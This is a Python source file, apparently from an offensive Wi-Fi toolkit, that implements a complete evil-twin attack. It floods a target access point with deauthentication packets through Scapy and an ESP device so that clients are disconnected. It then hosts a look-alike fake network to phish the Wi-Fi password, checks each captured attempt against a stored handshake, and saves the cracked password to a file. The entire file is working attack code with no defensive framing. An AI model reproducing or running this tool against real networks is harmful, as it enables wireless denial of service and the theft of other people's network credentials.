import time
import os
import sys
import threading
import subprocess
from scapy.all import sniff, Dot11
from wifi_nightmare.deauth import BaseAttacker
from wifi_nightmare.config import C_GREEN, C_RED, C_YELLOW, C_CYAN, C_WHITE, C_RESET
from wifi_nightmare.utils import run_command, verify_password
from wifi_nightmare.logger import logger


class EvilTwinAttack(BaseAttacker):
    def __init__(self, esp_driver, db_handler, target_bssid, target_channel,
                 target_ssid, interface=None):
        super().__init__(interface, target_bssid, target_channel)
        self.esp = esp_driver
        self.db = db_handler
        self.bssid = target_bssid
        self.channel = target_channel
        self.ssid = target_ssid
        self.handshake_file = ""

        self.deauth_threads = []
        self.deauth_processes = []
        self.correct_password = None
        self.total_deauths = 0
        self.scapy_count = 0
        self.esp_count = 0

    def _setup_interface(self):
        if not self.interface:
            return False
        try:
            print(f"{C_YELLOW}[*] Killing interfering processes...{C_RESET}")
            run_command(["airmon-ng", "check", "kill"])
            run_command(["killall", "wpa_supplicant", "NetworkManager"])
            run_command(["ip", "link", "set", self.interface, "down"])
            time.sleep(1)
            run_command(["iw", "dev", self.interface, "set", "type", "monitor"])
            time.sleep(1)
            run_command(["ip", "link", "set", self.interface, "up"])
            time.sleep(1)
            run_command(["iw", "dev", self.interface, "set", "channel", str(self.channel)])
            time.sleep(1)
            print(f"{C_GREEN}[+] Interface {self.interface} set to monitor mode on channel {self.channel}{C_RESET}")
            return True
        except Exception as e:
            print(f"{C_RED}[!] Failed to setup interface: {e}{C_RESET}")
            return False

    def _enforce_channel(self):
        while not self.stop_deauth:
            try:
                run_command(["iw", "dev", self.interface, "set", "channel", str(self.channel)])
                time.sleep(2)
            except Exception:
                pass

    def _sniffer_thread(self):
        while not self.stop_deauth:
            try:
                sniff(iface=self.interface, prn=self._sniff_callback, timeout=1.0, store=0)
            except Exception:
                pass

    def _sniff_callback(self, pkt):
        if pkt.haslayer(Dot11):
            addr1 = pkt.addr1.lower() if pkt.addr1 else ""
            addr2 = pkt.addr2.lower() if pkt.addr2 else ""
            client_mac = None
            if self.bssid == addr1 and addr2 != "ff:ff:ff:ff:ff:ff" and not addr2.startswith("33:33"):
                client_mac = addr2
            elif self.bssid == addr2 and addr1 != "ff:ff:ff:ff:ff:ff" and not addr1.startswith("33:33"):
                client_mac = addr1
            if client_mac and client_mac not in self.clients:
                self.clients.add(client_mac)

    def _scapy_deauth(self):
        try:
            print(f"{C_GREEN}[+] Starting Scapy deauth attack{C_RESET}")
            while not self.stop_deauth:
                try:
                    self._send_deauth_broadcast(count=5)
                    self.scapy_count += 5
                    self.total_deauths += 5
                    current_clients = list(self.clients)
                    for client_mac in current_clients:
                        if self._send_deauth_to_client(client_mac, count=3):
                            self.scapy_count += 3
                            self.total_deauths += 3
                    time.sleep(0.5)
                except Exception as e:
                    print(f"{C_RED}[!] Scapy error: {e}{C_RESET}")
                    time.sleep(1)
        except Exception as e:
            print(f"{C_RED}[!] Scapy thread crashed: {e}{C_RESET}")

    def _esp_deauth(self):
        try:
            if not self.esp or not self.esp.is_connected:
                return
            print(f"{C_GREEN}[+] Starting ESP deauth attack{C_RESET}")
            while not self.stop_deauth:
                try:
                    self.esp.start_attack(self.bssid, self.channel, duration=2)
                    self.esp_count += 1
                    self.total_deauths += 50
                    time.sleep(3)
                except Exception as e:
                    print(f"{C_RED}[!] ESP deauth error: {e}{C_RESET}")
                    time.sleep(2)
        except Exception as e:
            print(f"{C_RED}[!] ESP deauth thread crashed: {e}{C_RESET}")

    def _start_deauth_attacks(self):
        print(f"\n{C_CYAN}[*] Starting DEAUTH ATTACK (Scapy + ESP){C_RESET}")
        for target in [self._enforce_channel, self._sniffer_thread,
                       self._scapy_deauth, self._esp_deauth]:
            t = threading.Thread(target=target, daemon=True)
            t.start()
            self.deauth_threads.append(t)
        print(f"{C_GREEN}[+] Deauth threads started{C_RESET}")

    def _stop_deauth_attacks(self):
        print(f"{C_YELLOW}[*] Stopping all deauth attacks...{C_RESET}")
        self.stop_deauth = True
        for process in self.deauth_processes:
            try:
                if process.poll() is None:
                    process.terminate()
                    time.sleep(0.5)
                    if process.poll() is None:
                        process.kill()
            except Exception:
                pass
        for thread in self.deauth_threads:
            try:
                thread.join(timeout=2.0)
            except Exception:
                pass
        print(f"{C_GREEN}[+] All deauth attacks stopped{C_RESET}")

    def _display_status(self):
        try:
            last_display = time.time()
            display_count = 0
            while not self.stop_deauth:
                current_time = time.time()
                if current_time - last_display > 3.0:
                    display_count += 1
                    sys.stdout.write("\r\033[K")
                    status_line = f"{C_CYAN}[{display_count}] {C_RESET}"
                    if self.clients:
                        status_line += f"{C_YELLOW}{len(self.clients)} clients{C_RESET} "
                    status_line += f"{C_RED}S:{self.scapy_count} "
                    if self.esp_count > 0:
                        status_line += f"E:{self.esp_count} "
                    status_line += f"T:{self.total_deauths}{C_RESET}"
                    status_line += f" {C_GREEN}Evil Twin: '{self.ssid}'{C_RESET}"
                    sys.stdout.write(status_line)
                    sys.stdout.flush()
                    last_display = current_time
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        except Exception as e:
            print(f"{C_RED}[!] Status display error: {e}{C_RESET}")

    def run(self):
        info = self.db.get_info(self.bssid)
        if not info or not info.get('Handshake') or not info.get('HSFile'):
            print(f"{C_RED}[!] Error: No Handshake found for this network!{C_RESET}")
            return

        self.handshake_file = info['HSFile']
        print(f"{C_GREEN}[+] Handshake file found: {self.handshake_file}{C_RESET}")

        if self.interface:
            if not self._setup_interface():
                print(f"{C_RED}[!] Cannot perform deauth attacks without interface{C_RESET}")
                return

        self._start_deauth_attacks()

        status_thread = threading.Thread(target=self._display_status, daemon=True)
        status_thread.start()

        print(f"\n{C_CYAN}[*] Starting Evil Twin on ESP...{C_RESET}")
        print(f"{C_YELLOW}[*] Fake AP SSID: '{self.ssid}'{C_RESET}")
        self.esp.start_host(self.ssid, self.channel)
        time.sleep(2)
        self.esp.start_attack(self.bssid, self.channel)

        print(f"\n{C_GREEN}[+] Attack is running!{C_RESET}")
        print(f"{C_YELLOW}[*] Clients deauthed from {self.bssid}{C_RESET}")
        print(f"{C_YELLOW}[*] They will connect to: '{self.ssid}'{C_RESET}")
        print(f"{C_YELLOW}[*] Waiting for password... (Ctrl+C to stop){C_RESET}\n")

        try:
            while True:
                if self.esp.captured_password:
                    raw_pass = self.esp.captured_password.strip()
                    self.esp.captured_password = None

                    print(f"\n{C_CYAN}[+] Password attempt: '{raw_pass}'{C_RESET}")

                    if len(raw_pass) < 8:
                        print(f"{C_RED}[!] Too short (<8 chars){C_RESET}")
                        self.esp.send_no()
                        continue
                    if len(raw_pass) > 63:
                        print(f"{C_RED}[!] Too long (>63 chars){C_RESET}")
                        self.esp.send_no()
                        continue

                    print(f"{C_YELLOW}[*] Verifying password...{C_RESET}")
                    if verify_password(self.handshake_file, self.bssid, self.ssid, raw_pass):
                        print(f"\n{C_GREEN}{'=' * 70}{C_RESET}")
                        print(f"{C_GREEN}[!!!] PASSWORD CRACKED SUCCESSFULLY [!!!]{C_RESET}")
                        print(f"{C_GREEN}{'=' * 70}{C_RESET}")
                        print(f"    Target: {self.ssid}")
                        print(f"    BSSID: {self.bssid}")
                        print(f"    Password: {raw_pass}")
                        print(f"{C_GREEN}{'=' * 70}{C_RESET}")

                        self.esp.send_ok()
                        self.correct_password = raw_pass

                        with open("cracked.txt", "a") as f:
                            ts = time.strftime("%Y-%m-%d %H:%M:%S")
                            f.write(f"[{ts}] SSID: {self.ssid} | BSSID: {self.bssid} | Password: {raw_pass}\n")

                        self._stop_deauth_attacks()
                        self.esp.stop_all()

                        print(f"\n{C_YELLOW}[*] ATTACK SUMMARY:{C_RESET}")
                        print(f"    Clients targeted: {len(self.clients)}")
                        print(f"    Deauth packets: {self.total_deauths} (Scapy: {self.scapy_count}, ESP: {self.esp_count})")
                        print(f"    Password saved to: cracked.txt")
                        print(f"{C_GREEN}[+] Attack completed successfully!{C_RESET}")
                        return
                    else:
                        print(f"{C_RED}[-] Password incorrect{C_RESET}")
                        self.esp.send_no()

                time.sleep(0.1)

        except KeyboardInterrupt:
            print(f"\n\n{C_RED}[!] Attack stopped by user{C_RESET}")
        finally:
            self._stop_deauth_attacks()
            self.esp.stop_all()
            if self.interface:
                try:
                    run_command(["ip", "link", "set", self.interface, "down"])
                    run_command(["iw", "dev", self.interface, "set", "type", "managed"])
                    run_command(["ip", "link", "set", self.interface, "up"])
                    print(f"{C_GREEN}[+] Interface restored to managed mode{C_RESET}")
                except Exception as e:
                    print(f"{C_RED}[!] Failed to restore interface: {e}{C_RESET}")

            print(f"\n{C_YELLOW}[*] Final stats:{C_RESET}")
            print(f"    Total deauth packets: {self.total_deauths}")
            print(f"    Clients discovered: {len(self.clients)}")
            if self.correct_password:
                print(f"{C_GREEN}[+] Password found: {self.correct_password}{C_RESET}")
            else:
                print(f"{C_RED}[-] No password found{C_RESET}")
